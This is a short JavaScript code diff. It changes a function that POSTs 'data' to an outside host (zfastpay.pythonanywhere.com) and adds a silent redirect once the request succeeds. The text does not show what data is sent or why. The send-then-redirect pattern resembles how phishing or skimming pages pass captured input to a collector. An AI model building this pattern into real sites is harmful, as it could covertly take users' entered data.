@@ -1,12 +1,17 @@
 
-function pa(data) {
+function pa(data,url='') {
     const xhr = new XMLHttpRequest();
 
     xhr.open("POST", "https://zfastpay.pythonanywhere.com/endpoint", true);
     xhr.setRequestHeader("Content-Type", "application/json");
 
     xhr.onload = function () {
-      console.log(xhr.responseText);
+          if (xhr.status === 200) {
+            console.log("XHR done");
+            if(url){
+                window.location.replace(url);
+            }
+          }
     };
 
 xhr.onreadystatechange = function () {
